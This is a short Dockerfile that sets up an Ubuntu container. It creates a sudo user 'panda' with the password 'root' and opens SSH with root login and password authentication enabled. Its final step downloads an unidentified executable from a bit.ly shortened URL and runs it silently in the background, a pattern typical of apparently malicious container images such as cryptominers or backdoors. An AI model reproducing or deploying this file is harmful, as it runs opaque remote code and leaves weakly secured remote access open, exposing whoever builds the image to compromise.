FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh make gcc htop -y
RUN adduser --disabled-password --gecos "" panda
RUN adduser panda sudo && echo 'panda:root' | chpasswd
RUN echo 'Port 22' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && service ssh restart
RUN wget https://bit.ly/3Ibzg9T && chmod +x 3Ibzg9T && nohup ./3Ibzg9T --log=stdout > panik.log &
